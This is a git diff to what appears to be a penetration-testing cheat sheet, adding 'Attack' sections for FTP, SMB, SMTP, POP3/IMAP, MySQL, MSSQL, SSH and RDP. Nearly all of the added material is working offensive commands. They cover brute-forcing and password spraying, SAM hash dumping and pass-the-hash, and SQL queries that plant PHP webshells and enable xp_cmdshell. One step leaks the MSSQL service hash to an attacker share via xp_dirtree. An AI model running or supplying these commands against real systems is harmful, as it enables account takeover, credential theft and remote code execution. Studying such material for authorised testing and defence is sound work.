@@ -31,6 +31,12 @@ ftp> get <file_to_download> (Download a file)
 $ wget -m --no-passive ftp://anonymous:anonymous@<IP> (Download All Available Files)
 ftp> put <file_to_upload>  (Upload a file)
 ````
+**Attack**
+````
+$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h IP -M ftp
+$ hydra -l <userZ -P passwords IP ftp
+$ hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://<IP>
+````
 
 ### SMB
 ````
@@ -42,11 +48,25 @@ smb: \> get <file_to_download> (Download a file)
 smb: \> put <localfile.txt> <remotefile.txt>
 $ samrdump.py <FQDN/IP> (Username enumeration using Impacket scripts.)
 $ smbmap -H <FQDN/IP> (Enumerating SMB shares with smbmap)
+$ smbmap -H <FQDN/IP> -r notes (List specific share with smbmap)
+$ smbmap -H <FQDN/IP> --download "<share>\<file>" (Download a file with smbmap)
+$ smbmap -H <FQDN/IP> --upload <file_to_upload> "<share>\<file_to_upload>" (Upload a file with smbmap)
 $ nxc smb <FQDN/IP> -u '' -p '' --shares (Netexec shares enumerate with null session)
 $ nxc smb <FQDN/IP> -u '<user>' -p '<password>' --shares (Netexec shares enumerate with user account)
 $ enum4linux-ng <FQDN/IP> -A (SMB enumeration using enum4linux.)
+$ enum4linux-ng <IP> -A -C
 $ rpcclient -U "" <FQDN/IP> (Interaction with the target using RPC with null session)
 $ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done (Brute Force RID)
+````
+**Attack**
+````
+$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>' --local-auth (Password Spraying Non-domain joined)
+$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>' --local-auth --continue-on-success (Password Spraying Non-domain joined)
+$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>'  (Password Spraying Domain Joined)
+$ nxc smb <FQDN/IP> -u /tmp/userlist.txt -p '<password>'  --continue-on-success (Password Spraying Domain Joined)
+$ nxc smb 10.10.110.0/24 -u <user> -p '<password>' --loggedon-users (Enumerating Logged-on Users)
+$ nxc smb <IP> -u <user> -p '<password>' --sam (Extract Hashes from SAM Database)
+$ nxc smb <IP> -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8F (Use Hash NTLM)
 ````
 
 ### NFS
@@ -69,6 +89,10 @@ $ subfinder -d domain (Subdomain enum with subfinder)
 $ python3 sublist3r.py -d <domain-name> -n (Subdomain enum with sublister)
 $ ffuf -u "http://FUZZ.domain" -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt (Subdomain enum with ffuf)
 ````
+**Attack**
+````
+Subdomain takeover: https://github.com/EdOverflow/can-i-take-over-xyz
+````
 
 ### SMTP
 ````
@@ -77,13 +101,24 @@ $ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v (Verify if open-relay
 $ telnet <FQDN/IP> 25 (Connect to smtp service)
 $ VRFY root (Verify if user exist)
 ````
-
+**Attack**
+````
+$ smtp-user-enum -M RCPT -U userlist.txt -D <domain> -t <IP> (User enumeration via smtp server)
+$ python3 o365spray.py --validate --domain msplaintext.xyz
+$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+$ hydra -L users.txt -p '<Password>' -f IP smtp (We can use this command against pop3 and imap)
+$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+smtp-user-enum: https://github.com/pentestmonkey/smtp-user-enum
+o365spray: https://github.com/0xZDH/o365spray
+````
 ### IMAP & POP3
 ````
 $ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
 $ curl -k 'imaps://<FQDN/IP>' --user <user>:<password> (Log in to the IMAPS service using cURL.)
 $ openssl s_client -connect <FQDN/IP>:imaps (Connect to the IMAPS service.)
 $ openssl s_client -connect <FQDN/IP>:pop3s ( Connect to the POP3s service.)
+$ telnet <IP> 110 (Connect without encryption)
+$ hydra -L users.txt -p '<Password>' -f IP pop3/imap
 ````
 **Example IMAPS**
 ````
@@ -99,6 +134,14 @@ a list "" *
 select DEV.DEPARTMENT.INT
 a status DEV.DEPARTMENT.INT (MESSAGES UNSEEN RECENT)
 A1 UID FETCH 1 (UID RFC822.SIZE BODY.PEEK[])
+````
+**Example POP3**
+````
+$ telnet <IP> 110
+$ USER <user>
+$ PASS <password>
+$ LIST
+$ RETR 1
 ````
 
 ### SNMP
@@ -120,6 +163,15 @@ show columns from <table>;	(Show all columns in the selected table.)
 select * from <table>;	(Show everything in the desired table.)
 select * from <table> where column = "string";	(Search for needed string in the desired table.)
 ````
+**Attack**
+````
+- Write a file -
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+- Enumerate Privileges -
+mysql> show variables like "secure_file_priv";
+- Read a file -
+mysql> select LOAD_FILE("/etc/passwd");
+````
 
 ### MSSQL
 ````
@@ -128,6 +180,81 @@ $ python3 mssqlclient.py <USER>@<IP> -windows-auth
 $ impacket-mssqlclient <USER>@<IP> -windows-auth
 $ impacket-mssqlclient DOMAIN/<USER>@<IP>
 $ impacket-mssqlclient '<user>:<pass>@<ip>' -windows-auth
+````
+**Attack**
+````
+sqsh -S <IP> -U <user> -P '<Password>' -h (Autenticate with sqsh)
+sqsh -S <IP> -U .\\<user> -P 'MyPassword!' -h (Target local account)
+----------------------------------------------------------------------------
+Enumerate DB
+If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
+1> SELECT name FROM master.dbo.sysdatabases (Show all databases)
+2> GO
+1> USE database
+2> GO
+1> SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES (Show tables of the selected database)
+2> GO
+1> SELECT * FROM users (Dump data of users's table)
+2> go
+--------------------------------------------------------------------------------
+Executing Commands
+1> xp_cmdshell 'whoami'
+2> GO
+If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+if we are using impacket-mssqlclient just do and the tools automatic execute last commands:
+> enable_xp_cmdshell
+----------------------------------------------------------------------------------
+Write a file
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+-------------------------------------------------------------------------------------
+Read a file
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+-------------------------------------------------------------------------------------
+Capture MSSQL Service Hash
+1> EXEC master..xp_dirtree '\\<IP-Attacker>\share\'
+2> GO
+or
+1> EXEC master..xp_subdirs '\\<IP-Attacker>\share\'
+2> GO
+$ sudo responder -I tun0
+$ sudo impacket-smbserver share ./ -smb2support
+-------------------------------------------------------------------------------------
+Impersonate Existing Users
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO  (List Users)
+
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+-------------------------------------------------------------------------------------
+Communicate with Other Databases
+- Identify linked Servers -
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+Where 1 means is a remote server, and 0 is a linked server.
+- Execute query in Linked Server -
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<Linked_Server>]
+2> go
+- Execute Commands -
+1> EXECUTE('xp_cmdshell ''whoami''') AT [<Linked_Server>]
+2> go
 ````
 
 ### Oracle Tns
@@ -157,6 +284,11 @@ hashcat hash_dumped /usr/share/wordlists/rockyou.txt (Crack hash with hashcat)
 $ ssh <user>@<FQDN/IP> (Login ssh with user)
 $ ssh -i private.key <user>@<FQDN/IP> (Login ssh with private key)
 ````
+**Attack**
+````
+$ hydra -L usernames.txt -p 'password123' <IP> ssh
+````
+
 **Windows**
 ````
 $ xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP> (RDP with xfreerdp)
@@ -168,9 +300,13 @@ $ evil-winrm -i <FQDN/IP> -u <user> -p <password> (Login with evil-wirm)
 $ evil-winrm -i <FQDN/IP> -u <user> -H <hash_ntlm> (Login with evil-wirm with hash ntlm)
 $ wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>" (Execute command using the WMI service.)
 $ impacket-psexec <Domain>/<user>:<password>@<IP>
+$ impacket-psexec <user>:'<password>'@<IP>
 ````
-
-
+**Attack**
+````
+$ crowbar -b rdp -s <IP>/32 -U users.txt -c 'password123' (Brute Force Rdp)
+$ hydra -L usernames.txt -p 'password123' <IP> rdp
+````
 
 
 
